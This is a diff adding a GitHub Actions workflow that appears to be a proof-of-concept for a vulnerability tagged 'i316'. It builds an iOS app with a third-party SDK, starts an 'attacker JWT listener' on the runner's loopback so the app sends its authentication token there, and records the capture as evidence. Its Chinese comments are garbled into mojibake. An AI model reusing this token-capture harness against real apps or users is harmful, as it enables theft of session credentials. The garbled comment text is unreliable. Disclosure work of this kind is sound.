@@ -1,0 +1,70 @@
+# .github/workflows/i316-poc.yml â i316 è¿ç¨æ¨¡æå¨éªè¯ (private repo ä¹å¯è·, åè´¹ macOS é¢åº¦å¤ç¨)
+#
+# å·²æ ¸å®äºå®:
+#   - tag 15.2.0 ç xcframework å« ios-arm64_x86_64-simulator slice (main åæ¯ç²¾ç®æäº)
+#   - podspec s.source = git tag 15.2.0 â pod install æå³å¾å®æ¹æ¨¡æå¨ slice
+#   - macos-14 runner = Apple Silicon, Xcode é¢è£
+#   - iOS æ¨¡æå¨ä¸ runner å®¿ä¸»å±äº« loopback â app è¿ 127.0.0.1:18080 ç´è¾¾çå¬å¨
+#
+# è¯æ®äº§åº: poc-evidence.mp4 (æ¨¡æå¨å±å¹å½å) + captured-jwt.json + listener.log
+#
+# ä½¿ç¨æ¹æ³: æ¾å°ä»åº .github/workflows/i316-poc.yml, Actions é¡µæå¨è§¦å (workflow_dispatch)
+
+name: i316-simulator-poc
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  poc:
+    runs-on: macos-14
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Start attacker JWT listener (runner loopback)
+        run: |
+          nohup python3 capture-jwt.py 600 > listener.log 2>&1 &
+          sleep 1
+          head -2 listener.log
+
+      - name: Generate Xcode project
+        run: |
+          brew install xcodegen
+          xcodegen generate
+
+      - name: Install SDK (tag 15.2.0, å«å®æ¹æ¨¡æå¨ slice)
+        run: pod install
+
+      - name: Build for iOS Simulator (åç­¾å)
+        run: |
+          xcodebuild -workspace PoC.xcworkspace -scheme PoC \
+            -destination 'platform=iOS Simulator,name=iPhone 15,OS=latest' \
+            -derivedDataPath dd build CODE_SIGNING_ALLOWED=NO
+
+      - name: Launch on headless simulator + record screen (è¯æ®è§é¢)
+        run: |
+          xcrun simctl boot "iPhone 15" 2>/dev/null || true
+          xcrun simctl install booted dd/Build/Products/Debug-iphonesimulator/PoC.app
+          nohup xcrun simctl io booted recordVideo --codec h264 poc-evidence.mp4 >/dev/null 2>&1 &
+          echo $! > recorder.pid
+          xcrun simctl launch booted com.poc.i316
+          sleep 120   # çç» SDK è¿æ¥ + è§å¯èäºä»¶; äº¤äºæ­¥éª¤ (ç¹å»æé®) å¦éèªå¨åç¨åç»­ simctl/XCUITest
+
+      - name: Show capture result
+        run: |
+          kill $(cat recorder.pid) 2>/dev/null || pkill -f recordVideo || true
+          sleep 3
+          cat listener.log || true
+          echo "---- captured-jwt.json ----"
+          cat captured-jwt.json || echo "(no capture)"
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i316-capture
+          path: |
+            listener.log
+            captured-jwt.json
+            poc-evidence.mp4
